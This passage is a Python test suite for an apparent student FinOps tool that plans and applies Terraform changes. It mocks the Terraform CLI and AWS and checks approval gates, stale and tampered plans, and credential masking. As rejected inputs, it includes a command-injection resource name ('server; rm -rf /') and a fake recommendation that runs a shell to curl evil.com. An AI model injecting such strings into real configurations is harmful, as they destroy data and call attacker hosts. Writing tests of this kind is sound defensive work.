"""
tests/test_terraform.py
Comprehensive test suite for Checkpoint 6: Real Terraform Integration.

All subprocess executions are safely mocked — Terraform does NOT need to be installed.
All AWS verification calls are safely mocked.

Test scenarios:
 1. Terraform version detection
 2. Terraform not installed
 3. terraform fmt success
 4. terraform fmt failure
 5. terraform validate success
 6. terraform validate failure
 7. terraform plan success
 8. terraform plan failure
 9. Unsupported action rejected (UNSUPPORTED_ACTION)
10. Invalid resource ID rejected
11. Terraform injection / shell commands rejected (SECURITY_POLICY_VIOLATION)
12. Apply rejected without explicit approval (APPROVAL_REQUIRED)
13. Apply rejected without a valid plan (PLAN_NOT_FOUND)
14. Apply rejected when the plan is stale (PLAN_STALE)
15. Approved apply executes successfully
16. Apply failure is reported correctly (APPLY_FAILED)
17. AWS verification success
18. AWS verification failure
19. Missing AWS credentials during verification
20. Simulation mode still works without Terraform CLI
21. Live mode never uses fake Terraform success
22. Credentials are never written into Terraform files/logs
23. Destructive actions require additional confirmation (DESTRUCTIVE_CONFIRMATION_REQUIRED)
24. Config tampering detection after plan was created (CONFIG_TAMPERED)
25. POST /api/terraform/plan and POST /api/terraform/apply API endpoints

ISWE309L Cloud Computing - Course Project Review-1
Team: Vivek Pandey (24MIS0216) & S. Hemal (24MIS0050)
"""

import time
import shutil
import tempfile
import unittest
import subprocess
from pathlib import Path
from unittest.mock import patch, MagicMock

from core.models import (
    WasteFinding,
    WasteCategory,
    ResourceType,
    Severity,
    AIRecommendation,
    CostFinding,
)
from core.terraform.cli import (
    TerraformCLI,
    STATUS_SUCCESS,
    STATUS_TERRAFORM_NOT_INSTALLED,
    STATUS_FMT_FAILED,
    STATUS_VALIDATION_FAILED,
    sanitize_output,
)
from core.terraform.generator import (
    TerraformChangeGenerator,
    validate_untrusted_input,
    STATUS_UNSUPPORTED_ACTION,
    STATUS_SECURITY_POLICY_VIOLATION,
)
from core.terraform.service import (
    RealTerraformService,
    StoredPlan,
)
from core.terraform.models import (
    TerraformApprovalRequest,
)


def _make_sample_hcl() -> str:
    return (
        'provider "aws" {\n'
        '  region = "us-east-1"\n'
        '}\n\n'
        'resource "aws_instance" "analytics_batch_worker" {\n'
        '  ami           = "ami-0c7217cdde317cfec"\n'
        '  instance_type = "c5.4xlarge"\n'
        '  tags = {\n'
        '    Name = "analytics-batch-worker-prod"\n'
        '  }\n'
        '}\n\n'
        'resource "aws_ebs_volume" "backup_migration_temp" {\n'
        '  availability_zone = "us-east-1a"\n'
        '  size              = 500\n'
        '  tags = {\n'
        '    Name = "backup-volume-migration-temp"\n'
        '  }\n'
        '}\n\n'
        'resource "aws_lambda_function" "legacy_image_resizer" {\n'
        '  function_name = "legacy-image-resizer"\n'
        '  runtime       = "python3.9"\n'
        '  tags = {\n'
        '    Deprecated = "true"\n'
        '  }\n'
        '}\n\n'
        'resource "aws_eip" "unassociated_ip" {\n'
        '  domain = "vpc"\n'
        '  tags = {\n'
        '    Name = "unassociated-elastic-ip-1"\n'
        '  }\n'
        '}\n'
    )


def _make_ec2_finding() -> WasteFinding:
    return WasteFinding(
        id="f-ec2-1",
        resource_id="i-0abcdef1234567890",
        resource_name="analytics-batch-worker-prod",
        resource_type=ResourceType.EC2,
        waste_category=WasteCategory.OVERSIZED_COMPUTE,
        severity=Severity.HIGH,
        description="Compute operating at 3.2% CPU average.",
        current_specs="c5.4xlarge",
        recommended_specs="t3.medium",
        confidence_score=0.98,
        metrics_summary={
            "cpu_utilization_avg": 3.2,
            "recommended_instance_type": "t3.medium",
        },
    )


def _make_ebs_finding() -> WasteFinding:
    return WasteFinding(
        id="f-ebs-1",
        resource_id="vol-0123456789abcdef0",
        resource_name="backup-volume-migration-temp",
        resource_type=ResourceType.EBS,
        waste_category=WasteCategory.UNATTACHED_STORAGE,
        severity=Severity.MEDIUM,
        description="Detached EBS volume incurring provisioned GB fees.",
        current_specs="500 GB gp3",
        recommended_specs="Delete / Archive",
        confidence_score=0.99,
        metrics_summary={"size_gb": 500, "days_unattached": 14},
    )


class TestTerraformCLI(unittest.TestCase):

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.workspace = Path(self.temp_dir)
        self.cli = TerraformCLI(workspace_dir=self.workspace)

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    # ── 1. Terraform version detection ──────────────────────────────────

    @patch("shutil.which")
    @patch("subprocess.run")
    def test_terraform_version_detection(self, mock_run, mock_which):
        mock_which.return_value = "C:\\terraform\\terraform.exe"
        mock_run.return_value = subprocess.CompletedProcess(
            args=["terraform", "version"],
            returncode=0,
            stdout="Terraform v1.6.4\non windows_amd64\n",
            stderr="",
        )

        installed, version_str = self.cli.is_installed()
        self.assertTrue(installed)
        self.assertIn("Terraform v1.6.4", version_str)

    # ── 2. Terraform not installed ──────────────────────────────────────

    @patch("shutil.which", return_value=None)
    def test_terraform_not_installed(self, mock_which):
        installed, status = self.cli.is_installed()
        self.assertFalse(installed)
        self.assertEqual(status, STATUS_TERRAFORM_NOT_INSTALLED)

        # Running a command also reports not installed
        res = self.cli.run_command(["fmt"])
        self.assertFalse(res.success)
        self.assertEqual(res.status, STATUS_TERRAFORM_NOT_INSTALLED)
        self.assertEqual(res.return_code, 127)

    # ── 3. terraform fmt success ────────────────────────────────────────

    @patch("shutil.which", return_value="C:\\terraform\\terraform.exe")
    @patch("subprocess.run")
    def test_terraform_fmt_success(self, mock_run, mock_which):
        mock_run.return_value = subprocess.CompletedProcess(
            args=["terraform", "fmt", "-no-color"],
            returncode=0,
            stdout="main.tf\n",
            stderr="",
        )

        res = self.cli.fmt()
        self.assertTrue(res.success)
        self.assertEqual(res.status, STATUS_SUCCESS)
        self.assertEqual(res.return_code, 0)

    # ── 4. terraform fmt failure ────────────────────────────────────────

    @patch("shutil.which", return_value="C:\\terraform\\terraform.exe")
    @patch("subprocess.run")
    def test_terraform_fmt_failure(self, mock_run, mock_which):
        mock_run.return_value = subprocess.CompletedProcess(
            args=["terraform", "fmt", "-no-color"],
            returncode=2,
            stdout="",
            stderr="Error: Invalid syntax on line 4\n",
        )

        res = self.cli.fmt()
        self.assertFalse(res.success)
        self.assertEqual(res.status, STATUS_FMT_FAILED)
        self.assertEqual(res.return_code, 2)

    # ── 5. terraform validate success ───────────────────────────────────

    @patch("shutil.which", return_value="C:\\terraform\\terraform.exe")
    @patch("subprocess.run")
    def test_terraform_validate_success(self, mock_run, mock_which):
        mock_run.return_value = subprocess.CompletedProcess(
            args=["terraform", "validate", "-no-color"],
            returncode=0,
            stdout="Success! The configuration is valid.\n",
            stderr="",
        )

        res = self.cli.validate()
        self.assertTrue(res.valid)
        self.assertEqual(res.status, STATUS_SUCCESS)

    # ── 6. terraform validate failure ───────────────────────────────────

    @patch("shutil.which", return_value="C:\\terraform\\terraform.exe")
    @patch("subprocess.run")
    def test_terraform_validate_failure(self, mock_run, mock_which):
        mock_run.return_value = subprocess.CompletedProcess(
            args=["terraform", "validate", "-no-color"],
            returncode=1,
            stdout="",
            stderr="Error: Reference to undeclared input variable\n",
        )

        res = self.cli.validate()
        self.assertFalse(res.valid)
        self.assertEqual(res.status, STATUS_VALIDATION_FAILED)
        self.assertEqual(res.error_count, 1)

    # ── 7. terraform plan success ───────────────────────────────────────

    @patch("shutil.which", return_value="C:\\terraform\\terraform.exe")
    @patch("subprocess.run")
    def test_terraform_plan_success(self, mock_run, mock_which):
        mock_run.return_value = subprocess.CompletedProcess(
            args=["terraform", "plan", "-no-color", "-input=false"],
            returncode=0,
            stdout="Plan: 1 to change, 0 to add, 0 to destroy.\n",
            stderr="",
        )

        res = self.cli.plan()
        self.assertTrue(res.success)
        self.assertEqual(res.status, STATUS_SUCCESS)
        self.assertIn("Plan: 1 to change", res.stdout)

    # ── 8. terraform plan failure ───────────────────────────────────────

    @patch("shutil.which", return_value="C:\\terraform\\terraform.exe")
    @patch("subprocess.run")
    def test_terraform_plan_failure(self, mock_run, mock_which):
        mock_run.return_value = subprocess.CompletedProcess(
            args=["terraform", "plan", "-no-color", "-input=false"],
            returncode=1,
            stdout="",
            stderr="Error: Provider produced inconsistent final plan\n",
        )

        res = self.cli.plan()
        self.assertFalse(res.success)
        self.assertEqual(res.status, "EXECUTION_ERROR")


class TestTerraformSecurityAndGenerator(unittest.TestCase):

    def setUp(self):
        self.generator = TerraformChangeGenerator()
        self.hcl = _make_sample_hcl()

    # ── 9. Unsupported action rejected ──────────────────────────────────

    def test_unsupported_action_rejected(self):
        """Unsupported actions or categories must return UNSUPPORTED_ACTION."""
        finding = WasteFinding(
            id="f-unknown-1",
            resource_id="res-123",
            resource_name="mysterious-resource",
            resource_type=ResourceType.RDS,  # RDS automated modification is unsupported
            waste_category=WasteCategory.ORPHAN_SNAPSHOT,
            severity=Severity.LOW,
            description="Orphan snapshot.",
            current_specs="",
            recommended_specs="Purge snapshot",
            confidence_score=0.9,
        )

        new_hcl, action, status = self.generator.generate_modification(finding, self.hcl)
        self.assertIsNone(new_hcl)
        self.assertEqual(status, STATUS_UNSUPPORTED_ACTION)

    # ── 10. Invalid resource ID rejected ────────────────────────────────

    def test_invalid_resource_id_rejected(self):
        """Resource IDs containing shell or path characters must be rejected."""
        finding = _make_ec2_finding()
        finding.resource_name = "server; rm -rf /"

        is_safe, msg = validate_untrusted_input(finding)
        self.assertFalse(is_safe)

        new_hcl, action, status = self.generator.generate_modification(finding, self.hcl)
        self.assertIsNone(new_hcl)
        self.assertIn("Invalid or unsafe resource name", status)

    # ── 11. Terraform injection rejected ────────────────────────────────

    def test_terraform_provisioner_injection_rejected(self):
        """Bedrock recommendation attempting to inject local-exec or curl is rejected."""
        finding = _make_ec2_finding()
        malicious_rec = AIRecommendation(
            finding_id=finding.id,
            resource_id=finding.resource_id,
            resource_name=finding.resource_name,
            title="Inject provisioner",
            executive_summary="Add local-exec provisioner to main.tf",
            risk_level="High Risk",
            rationale="local-exec /bin/sh -c 'curl evil.com'",
            steps_to_remediate=["local-exec execute command"],
            rollback_plan="",
            confidence_score=0.5,
        )

        new_hcl, action, status = self.generator.generate_modification(
            finding=finding,
            content=self.hcl,
            recommendation=malicious_rec,
        )
        self.assertIsNone(new_hcl)
        self.assertEqual(status, STATUS_SECURITY_POLICY_VIOLATION)

    # ── 22. Credentials are never written into Terraform files/logs ──────

    def test_credential_masking_in_outputs(self):
        """sanitize_output strips out AWS keys and secrets."""
        raw = "Error: Invalid credentials AKIAIOSFODNN7EXAMPLE with secret_key = 'abcd1234efgh5678ijkl9012mnop3456qrst'"
        sanitized = sanitize_output(raw)
        self.assertNotIn("AKIAIOSFODNN7EXAMPLE", sanitized)
        self.assertIn("AKIA****************", sanitized)
        self.assertNotIn("abcd1234efgh5678ijkl", sanitized)


class TestRealTerraformService(unittest.TestCase):

    def setUp(self):
        self.temp_source = tempfile.mkdtemp()
        self.temp_workspace = tempfile.mkdtemp()
        self.source_dir = Path(self.temp_source)
        self.workspace_dir = Path(self.temp_workspace)

        # Write sample HCL to source_dir
        (self.source_dir / "main.tf").write_text(_make_sample_hcl(), encoding="utf-8")
        (self.source_dir / "variables.tf").write_text('variable "region" { default = "us-east-1" }\n', encoding="utf-8")

        self.service = RealTerraformService(
            workspace_dir=self.workspace_dir,
            source_dir=self.source_dir,
            use_live_terraform=True,
            region_name="us-east-1",
        )

    def tearDown(self):
        shutil.rmtree(self.temp_source, ignore_errors=True)
        shutil.rmtree(self.temp_workspace, ignore_errors=True)

    # ── 12. Apply rejected without explicit approval ────────────────────

    @patch("shutil.which", return_value="C:\\terraform\\terraform.exe")
    @patch.object(TerraformCLI, "is_installed", return_value=(True, "Terraform v1.6.4"))
    @patch.object(TerraformCLI, "fmt")
    @patch.object(TerraformCLI, "validate")
    @patch.object(TerraformCLI, "plan")
    def test_apply_rejected_without_explicit_approval(self, mock_plan, mock_val, mock_fmt, mock_inst, mock_which):
        mock_fmt.return_value = MagicMock(success=True)
        mock_val.return_value = MagicMock(valid=True)
        mock_plan.return_value = MagicMock(success=True, stdout="Plan output", stderr="", return_code=0)

        plan_res = self.service.create_plan([_make_ec2_finding()])
        self.assertTrue(plan_res.success)
        self.assertTrue(plan_res.requires_approval)

        # User tries to apply with approved=False
        app_req = TerraformApprovalRequest(
            plan_id=plan_res.plan_id,
            approved=False,
            confirm_destructive=False,
        )
        apply_res = self.service.apply_plan(app_req)

        self.assertFalse(apply_res.success)
        self.assertEqual(apply_res.status, "APPROVAL_REQUIRED")

    # ── 13. Apply rejected without a valid plan ─────────────────────────

    def test_apply_rejected_without_valid_plan(self):
        app_req = TerraformApprovalRequest(
            plan_id="non-existent-plan-id",
            approved=True,
        )
        apply_res = self.service.apply_plan(app_req)

        self.assertFalse(apply_res.success)
        self.assertEqual(apply_res.status, "PLAN_NOT_FOUND")

    # ── 14. Apply rejected when plan is stale ───────────────────────────

    def test_apply_rejected_when_plan_is_stale(self):
        fake_plan_id = "plan-stale-1"
        stored = StoredPlan(
            plan_id=fake_plan_id,
            config_hash="abc",
            affected_resources=["analytics-batch-worker-prod"],
            proposed_actions=["RESIZE"],
            is_destructive=False,
            plan_file=self.workspace_dir / "test.tfplan",
            unified_diff="",
        )
        # Artificially age the plan beyond 1800 seconds
        stored.created_at = time.time() - 3600
        self.service.active_plans[fake_plan_id] = stored

        app_req = TerraformApprovalRequest(plan_id=fake_plan_id, approved=True)
        apply_res = self.service.apply_plan(app_req)

        self.assertFalse(apply_res.success)
        self.assertEqual(apply_res.status, "PLAN_STALE")

    # ── 23. Destructive actions require additional confirmation ─────────

    @patch("shutil.which", return_value="C:\\terraform\\terraform.exe")
    @patch.object(TerraformCLI, "is_installed", return_value=(True, "Terraform v1.6.4"))
    @patch.object(TerraformCLI, "fmt")
    @patch.object(TerraformCLI, "validate")
    @patch.object(TerraformCLI, "plan")
    def test_destructive_actions_require_confirmation(self, mock_plan, mock_val, mock_fmt, mock_inst, mock_which):
        """Deleting an unattached EBS volume is destructive; requires confirm_destructive=True."""
        mock_fmt.return_value = MagicMock(success=True)
        mock_val.return_value = MagicMock(valid=True)
        mock_plan.return_value = MagicMock(success=True, stdout="Plan: 1 to destroy", stderr="", return_code=0)

        plan_res = self.service.create_plan([_make_ebs_finding()])
        self.assertTrue(plan_res.success)
        self.assertTrue(plan_res.is_destructive)

        # Approved=True, but confirm_destructive=False
        app_req = TerraformApprovalRequest(
            plan_id=plan_res.plan_id,
            approved=True,
            confirm_destructive=False,
        )
        apply_res = self.service.apply_plan(app_req)

        self.assertFalse(apply_res.success)
        self.assertEqual(apply_res.status, "DESTRUCTIVE_CONFIRMATION_REQUIRED")

    # ── 24. Config tampering detected after plan created ────────────────

    @patch("shutil.which", return_value="C:\\terraform\\terraform.exe")
    @patch.object(TerraformCLI, "is_installed", return_value=(True, "Terraform v1.6.4"))
    @patch.object(TerraformCLI, "fmt")
    @patch.object(TerraformCLI, "validate")
    @patch.object(TerraformCLI, "plan")
    def test_config_tampering_rejected(self, mock_plan, mock_val, mock_fmt, mock_inst, mock_which):
        mock_fmt.return_value = MagicMock(success=True)
        mock_val.return_value = MagicMock(valid=True)
        mock_plan.return_value = MagicMock(success=True, stdout="Plan", stderr="", return_code=0)

        plan_res = self.service.create_plan([_make_ec2_finding()])
        self.assertTrue(plan_res.success)

        # Tamper with workspace main.tf behind the scenes
        main_tf = self.workspace_dir / "main.tf"
        main_tf.write_text(main_tf.read_text() + "\n# rogue addition", encoding="utf-8")

        app_req = TerraformApprovalRequest(plan_id=plan_res.plan_id, approved=True)
        apply_res = self.service.apply_plan(app_req)

        self.assertFalse(apply_res.success)
        self.assertEqual(apply_res.status, "CONFIG_TAMPERED")

    # ── 15. Approved apply executes successfully ────────────────────────

    @patch("shutil.which", return_value="C:\\terraform\\terraform.exe")
    @patch.object(TerraformCLI, "is_installed", return_value=(True, "Terraform v1.6.4"))
    @patch.object(TerraformCLI, "fmt")
    @patch.object(TerraformCLI, "validate")
    @patch.object(TerraformCLI, "plan")
    @patch.object(TerraformCLI, "apply")
    def test_approved_apply_executes(self, mock_apply, mock_plan, mock_val, mock_fmt, mock_inst, mock_which):
        mock_fmt.return_value = MagicMock(success=True)
        mock_val.return_value = MagicMock(valid=True)
        mock_plan.return_value = MagicMock(success=True, stdout="Plan: 1 to change", stderr="", return_code=0)
        mock_apply.return_value = MagicMock(success=True, stdout="Apply complete! Resources: 1 modified.", stderr="", return_code=0)

        plan_res = self.service.create_plan([_make_ec2_finding()])
        self.assertTrue(plan_res.success)

        app_req = TerraformApprovalRequest(plan_id=plan_res.plan_id, approved=True)
        apply_res = self.service.apply_plan(app_req, use_live_aws=False)

        self.assertTrue(apply_res.success)
        self.assertEqual(apply_res.status, STATUS_SUCCESS)
        self.assertIn("Apply complete!", apply_res.stdout)
        mock_apply.assert_called_once()

    # ── 16. Apply failure is reported correctly ─────────────────────────

    @patch("shutil.which", return_value="C:\\terraform\\terraform.exe")
    @patch.object(TerraformCLI, "is_installed", return_value=(True, "Terraform v1.6.4"))
    @patch.object(TerraformCLI, "fmt")
    @patch.object(TerraformCLI, "validate")
    @patch.object(TerraformCLI, "plan")
    @patch.object(TerraformCLI, "apply")
    def test_apply_failure_reported_correctly(self, mock_apply, mock_plan, mock_val, mock_fmt, mock_inst, mock_which):
        mock_fmt.return_value = MagicMock(success=True)
        mock_val.return_value = MagicMock(valid=True)
        mock_plan.return_value = MagicMock(success=True, stdout="Plan", stderr="", return_code=0)
        mock_apply.return_value = MagicMock(success=False, stdout="", stderr="Error: InsufficientInstanceCapacity", return_code=1)

        plan_res = self.service.create_plan([_make_ec2_finding()])
        app_req = TerraformApprovalRequest(plan_id=plan_res.plan_id, approved=True)

        apply_res = self.service.apply_plan(app_req, use_live_aws=False)
        self.assertFalse(apply_res.success)
        self.assertEqual(apply_res.status, "APPLY_FAILED")
        self.assertIn("InsufficientInstanceCapacity", apply_res.stderr)

    # ── 17 & 18. AWS verification success & failure ─────────────────────

    @patch("core.terraform.service.AWSConnectionService")
    @patch("core.aws.discovery.AWSDiscoveryService")
    def test_aws_verification_success(self, mock_disc_class, mock_conn_class):
        mock_conn = MagicMock()
        mock_conn.get_caller_identity.return_value = {"authenticated": True, "account_id": "123"}
        mock_conn_class.return_value = mock_conn

        mock_disc = MagicMock()
        mock_disc.discover_all.return_value = {
            "instances": [{"name": "analytics-batch-worker-prod", "id": "i-123"}],
            "volumes": [],
        }
        mock_disc_class.return_value = mock_disc

        ver = self.service._verify_aws_change(["analytics-batch-worker-prod"], use_live_aws=True)
        self.assertTrue(ver.verified)
        self.assertEqual(ver.status, "VERIFIED")

    # ── 19. Missing AWS credentials during verification ─────────────────

    @patch("core.terraform.service.AWSConnectionService")
    def test_aws_verification_missing_credentials(self, mock_conn_class):
        mock_conn = MagicMock()
        mock_conn.get_caller_identity.return_value = {
            "authenticated": False,
            "status": "CREDENTIALS_MISSING",
            "message": "No credentials discovered in AWS provider chain.",
        }
        mock_conn_class.return_value = mock_conn

        ver = self.service._verify_aws_change(["analytics-batch-worker-prod"], use_live_aws=True)
        self.assertFalse(ver.verified)
        self.assertEqual(ver.status, "CREDENTIALS_MISSING")

    # ── 20. Simulation mode works without Terraform CLI ─────────────────

    def test_simulation_mode_does_not_call_terraform_cli(self):
        """In simulation mode (use_live_terraform=False), plan & apply succeed without CLI."""
        sim_service = RealTerraformService(
            workspace_dir=self.workspace_dir,
            source_dir=self.source_dir,
            use_live_terraform=False,
        )

        plan_res = sim_service.create_plan([_make_ec2_finding()])
        self.assertTrue(plan_res.success)
        self.assertIn("Simulated Plan", plan_res.stdout)

        app_req = TerraformApprovalRequest(plan_id=plan_res.plan_id, approved=True)
        apply_res = sim_service.apply_plan(app_req, use_live_aws=False)
        self.assertTrue(apply_res.success)
        self.assertEqual(apply_res.verification.status, "SIMULATED")

    # ── 21. Live mode never uses fake Terraform success ─────────────────

    @patch("shutil.which", return_value=None)
    def test_live_mode_never_fakes_terraform_success(self, mock_which):
        """When Terraform CLI is absent, live mode returns TERRAFORM_NOT_INSTALLED, never success."""
        plan_res = self.service.create_plan([_make_ec2_finding()])
        self.assertFalse(plan_res.success)
        self.assertEqual(plan_res.status, STATUS_TERRAFORM_NOT_INSTALLED)


class TestTerraformApiEndpoints(unittest.TestCase):

    def test_plan_and_apply_endpoints(self):
        """Tests POST /api/terraform/plan and POST /api/terraform/apply via FastAPI TestClient."""
        from fastapi.testclient import TestClient
        from app.server import app

        client = TestClient(app)

        # 1. Generate plan in simulation mode
        plan_resp = client.post("/api/terraform/plan", json={"scenario": "enterprise", "use_live_terraform": False})
        self.assertEqual(plan_resp.status_code, 200)
        plan_data = plan_resp.json()

        self.assertTrue(plan_data["success"])
        self.assertTrue(plan_data["requires_approval"])
        plan_id = plan_data["plan_id"]
        self.assertTrue(plan_id)

        # 2. Reject apply without approval
        apply_no_app = client.post("/api/terraform/apply", json={"plan_id": plan_id, "approved": False})
        self.assertEqual(apply_no_app.status_code, 200)
        self.assertEqual(apply_no_app.json()["status"], "APPROVAL_REQUIRED")

        # 3. Apply with approval (including destructive if required)
        is_destr = plan_data.get("is_destructive", False)
        apply_resp = client.post("/api/terraform/apply", json={
            "plan_id": plan_id,
            "approved": True,
            "confirm_destructive": is_destr,
            "use_live_aws": False,
        })
        self.assertEqual(apply_resp.status_code, 200)
        apply_data = apply_resp.json()
        self.assertTrue(apply_data["success"])


class TestTerraformEightSafetyScenarios(unittest.TestCase):
    """
    Direct regression test suite for the 8 specific safety scenarios:
    1. Plan created -> approval -> apply succeeds using same plan.
    2. Missing plan -> apply blocked with PLAN_NOT_FOUND.
    3. Expired plan -> apply blocked with PLAN_STALE.
    4. Modified plan/configuration (tampering) -> apply blocked with CONFIG_TAMPERED.
    5. Hash mismatch -> apply blocked.
    6. Wrong plan path / missing plan file -> apply blocked with PLAN_NOT_FOUND.
    7. New plan after expiration -> requires fresh approval.
    8. Destructive plan -> secondary confirmation still required (DESTRUCTIVE_CONFIRMATION_REQUIRED).
    """

    def setUp(self):
        self.temp_source = tempfile.mkdtemp()
        self.temp_workspace = tempfile.mkdtemp()
        self.source_dir = Path(self.temp_source)
        self.workspace_dir = Path(self.temp_workspace)

        (self.source_dir / "main.tf").write_text(_make_sample_hcl(), encoding="utf-8")
        self.service = RealTerraformService(
            workspace_dir=self.workspace_dir,
            source_dir=self.source_dir,
            use_live_terraform=False,  # Simulation mode tests core engine invariants
        )

    def tearDown(self):
        shutil.rmtree(self.temp_source, ignore_errors=True)
        shutil.rmtree(self.temp_workspace, ignore_errors=True)

    # 1. Plan created -> approval -> apply succeeds using same plan
    def test_scenario_1_plan_created_approval_apply_succeeds(self):
        plan_res = self.service.create_plan([_make_ec2_finding()])
        self.assertTrue(plan_res.success)
        self.assertTrue(plan_res.plan_id.startswith("plan-"))
        self.assertTrue(Path(plan_res.plan_file).exists())

        approval = TerraformApprovalRequest(
            plan_id=plan_res.plan_id,
            approved=True,
            confirm_destructive=False,
            reviewer="Lead Engineer"
        )
        apply_res = self.service.apply_plan(approval)
        self.assertTrue(apply_res.success)
        self.assertEqual(apply_res.status, STATUS_SUCCESS)
        self.assertEqual(apply_res.plan_id, plan_res.plan_id)

    # 2. Missing plan -> apply blocked with PLAN_NOT_FOUND
    def test_scenario_2_missing_plan_blocked_with_plan_not_found(self):
        approval = TerraformApprovalRequest(
            plan_id="plan-nonexistent-12345",
            approved=True,
            confirm_destructive=False,
        )
        apply_res = self.service.apply_plan(approval)
        self.assertFalse(apply_res.success)
        self.assertEqual(apply_res.status, "PLAN_NOT_FOUND")
        self.assertIn("not found or expired", apply_res.stderr)

    # 3. Expired plan -> apply blocked with PLAN_STALE
    def test_scenario_3_expired_plan_blocked_with_plan_stale(self):
        plan_res = self.service.create_plan([_make_ec2_finding()])
        stored_plan = self.service.active_plans[plan_res.plan_id]
        stored_plan.created_at = time.time() - 3600  # Stale (>1800s)

        approval = TerraformApprovalRequest(
            plan_id=plan_res.plan_id,
            approved=True,
        )
        apply_res = self.service.apply_plan(approval)
        self.assertFalse(apply_res.success)
        self.assertEqual(apply_res.status, "PLAN_STALE")
        self.assertIn("stale", apply_res.stderr.lower())

    # 4. Modified configuration (tampering) -> apply blocked with CONFIG_TAMPERED
    def test_scenario_4_modified_config_tampering_blocked(self):
        plan_res = self.service.create_plan([_make_ec2_finding()])
        main_tf = self.workspace_dir / "main.tf"
        main_tf.write_text(main_tf.read_text(encoding="utf-8") + "\n# unexpected edit", encoding="utf-8")

        approval = TerraformApprovalRequest(
            plan_id=plan_res.plan_id,
            approved=True,
        )
        apply_res = self.service.apply_plan(approval)
        self.assertFalse(apply_res.success)
        self.assertEqual(apply_res.status, "CONFIG_TAMPERED")
        self.assertIn("modified since the plan was reviewed", apply_res.stderr)

    # 5. Hash mismatch -> apply blocked
    def test_scenario_5_hash_mismatch_blocked(self):
        plan_res = self.service.create_plan([_make_ec2_finding()])
        stored_plan = self.service.active_plans[plan_res.plan_id]
        plan_file = Path(stored_plan.plan_file)
        plan_file.write_text("TAMPERED_PLAN_PAYLOAD", encoding="utf-8")

        approval = TerraformApprovalRequest(
            plan_id=plan_res.plan_id,
            approved=True,
        )
        apply_res = self.service.apply_plan(approval)
        self.assertFalse(apply_res.success)
        self.assertEqual(apply_res.status, "CONFIG_TAMPERED")
        self.assertIn("tampered with", apply_res.stderr.lower())

    # 6. Wrong plan path / missing plan file -> apply blocked with PLAN_NOT_FOUND
    def test_scenario_6_wrong_plan_path_or_missing_plan_file_blocked(self):
        plan_res = self.service.create_plan([_make_ec2_finding()])
        stored_plan = self.service.active_plans[plan_res.plan_id]
        Path(stored_plan.plan_file).unlink()

        approval = TerraformApprovalRequest(
            plan_id=plan_res.plan_id,
            approved=True,
        )
        apply_res = self.service.apply_plan(approval)
        self.assertFalse(apply_res.success)
        self.assertEqual(apply_res.status, "PLAN_NOT_FOUND")

    # 7. New plan after expiration -> requires fresh approval
    def test_scenario_7_new_plan_after_expiration_requires_fresh_approval(self):
        # 1. Create first plan and age it
        plan1_res = self.service.create_plan([_make_ec2_finding()])
        self.service.active_plans[plan1_res.plan_id].created_at = time.time() - 3600

        # Attempting apply on plan 1 fails as stale
        app1 = TerraformApprovalRequest(plan_id=plan1_res.plan_id, approved=True)
        apply1_res = self.service.apply_plan(app1)
        self.assertEqual(apply1_res.status, "PLAN_STALE")

        # 2. Generate new fresh plan
        plan2_res = self.service.create_plan([_make_ec2_finding()])
        self.assertNotEqual(plan2_res.plan_id, plan1_res.plan_id)

        # 3. New plan requires its own fresh approval: approved=False fails
        app2_unapproved = TerraformApprovalRequest(plan_id=plan2_res.plan_id, approved=False)
        apply2_unapproved = self.service.apply_plan(app2_unapproved)
        self.assertEqual(apply2_unapproved.status, "APPROVAL_REQUIRED")

        # 4. Approving new plan succeeds
        app2_approved = TerraformApprovalRequest(plan_id=plan2_res.plan_id, approved=True)
        apply2_approved = self.service.apply_plan(app2_approved)
        self.assertTrue(apply2_approved.success)
        self.assertEqual(apply2_approved.status, STATUS_SUCCESS)

    # 8. Destructive plan -> secondary confirmation still required
    def test_scenario_8_destructive_plan_requires_secondary_confirmation(self):
        plan_res = self.service.create_plan([_make_ebs_finding()])
        self.assertTrue(plan_res.is_destructive)

        # Approved=True, but confirm_destructive=False -> BLOCKED
        app_unconfirmed = TerraformApprovalRequest(
            plan_id=plan_res.plan_id,
            approved=True,
            confirm_destructive=False,
        )
        apply_unconf = self.service.apply_plan(app_unconfirmed)
        self.assertFalse(apply_unconf.success)
        self.assertEqual(apply_unconf.status, "DESTRUCTIVE_CONFIRMATION_REQUIRED")

        # Approved=True, confirm_destructive=True -> SUCCEEDS
        app_confirmed = TerraformApprovalRequest(
            plan_id=plan_res.plan_id,
            approved=True,
            confirm_destructive=True,
        )
        apply_conf = self.service.apply_plan(app_confirmed)
        self.assertTrue(apply_conf.success)
        self.assertEqual(apply_conf.status, STATUS_SUCCESS)

    def test_pipeline_run_attaches_active_terraform_plan(self):
        from core.engine import FinOpsEngine
        eng = FinOpsEngine(use_live_aws=False)
        report = eng.execute_full_pipeline("enterprise")
        self.assertIsNotNone(report.terraform_plan_id)
        self.assertTrue(report.terraform_plan_id.startswith("plan-"))
        self.assertIn(report.terraform_plan_id, eng.terraform_service.active_plans)
        self.assertEqual(report.terraform_plan_status, STATUS_SUCCESS)

        # Apply using that exact plan ID from report with approval
        approval = TerraformApprovalRequest(
            plan_id=report.terraform_plan_id,
            approved=True,
            confirm_destructive=True,
        )
        apply_res = eng.terraform_service.apply_plan(approval)
        self.assertTrue(apply_res.success)

    # ── Live Unmanaged EBS Import & Destroy Plan Generation ───────────

    @patch("shutil.which", return_value="C:\\terraform\\terraform.exe")
    @patch.object(TerraformCLI, "is_installed", return_value=(True, "Terraform v1.16.5"))
    @patch.object(TerraformCLI, "init")
    @patch.object(TerraformCLI, "state_list")
    @patch.object(TerraformCLI, "import_resource")
    @patch.object(TerraformCLI, "fmt")
    @patch.object(TerraformCLI, "validate")
    @patch.object(TerraformCLI, "plan")
    @patch.object(TerraformCLI, "show")
    def test_live_unmanaged_ebs_import_and_destroy_plan(
        self, mock_show, mock_plan, mock_val, mock_fmt, mock_import, mock_state, mock_init, mock_inst, mock_which
    ):
        """
        In live mode, unmanaged EBS findings trigger controlled import into Terraform state
        and generate a genuine destroy plan with binary artifact.
        """
        mock_init.return_value = MagicMock(success=True, return_code=0, stdout="Initialized", stderr="")
        mock_state.return_value = []  # not yet in state
        mock_import.return_value = MagicMock(success=True, return_code=0, stdout="Import successful!", stderr="")
        mock_fmt.return_value = MagicMock(success=True)
        mock_val.return_value = MagicMock(valid=True)
        mock_plan.return_value = MagicMock(success=True, stdout="Plan: 0 to add, 0 to change, 1 to destroy.", stderr="", return_code=0)
        mock_show.return_value = MagicMock(
            success=True,
